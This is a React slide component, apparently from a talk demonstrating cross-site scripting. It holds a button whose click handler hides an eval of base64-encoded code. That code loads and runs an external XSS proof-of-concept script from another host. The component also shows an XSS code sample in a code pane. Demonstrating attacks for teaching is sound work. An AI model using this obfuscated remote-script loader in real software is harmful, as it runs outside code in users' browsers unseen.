import React from "react";

import {
    CodePane,
    Fill,
    Fit,
    Heading,
    Image,
    Layout
} from "spectacle";

const images = {
    pokemon: {
        jynx: require('../assets/jynx.jpg'),
        gyrados: require('../assets/gyarados.jpg'),
        charizard: require('../assets/charizard.jpg'),
        bulbasaur: require('../assets/bulbasaur.jpg'),
        mewtwo: require('../assets/mewtwo.jpg'),
        arcanine: require('../assets/arcanine.jpg'),
        abra: require('../assets/abra.jpg'),
        dewgong: require('../assets/dewgong.jpg'),
        delphox: require('../assets/delphox.jpg'),
        bellsprout: require('../assets/bellsprout.jpg')
    }
};

export default React.createClass({
    onClick(e) {
        eval(atob(`JC5nZXRTY3JpcHQoJ2h0dHBzOi8vZGluaXNjcnV6LmdpdGh1Yi5pby9YU1MtUG9jcy9wb2NzL2RhbmNlLXhzcy5qcycp`));
        e.preventDefault();
        e.stopPropagation();
    },

    render() {
        const styles = {
            padding: 20,
            background: "black",
            minWidth: 300,
            marginTop: 20,
            textTransform: "uppercase",
            border: "none",
            color: "white",
            outline: "none",
            fontWeight: "bold",
            fontSize: "2em"
        };
        const center = {
            textAlign: "center"
        };
        return (
            <div>
                <button style={styles} type="button" onClick={this.onClick}>How bad can it be?</button>
                <Layout style={center}>
                    <Fit>
                        <Image margin={10} src={images.pokemon.charizard} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.gyrados} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.jynx} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.delphox} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.abra} width="150px" height="150px"></Image>
                    </Fit>
                </Layout>
                <Layout>
                    <Fit>
                        <Image margin={10} src={images.pokemon.bulbasaur} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.mewtwo} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.arcanine} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.bellsprout} width="150px" height="150px"></Image>
                    </Fit>
                    <Fit>
                        <Image margin={10} src={images.pokemon.dewgong} width="150px" height="150px"></Image>
                    </Fit>
                </Layout>
                <CodePane source={require('raw!../assets/xss')} lang="javascript" textSize={14} />
            </div>
        )
    }
})

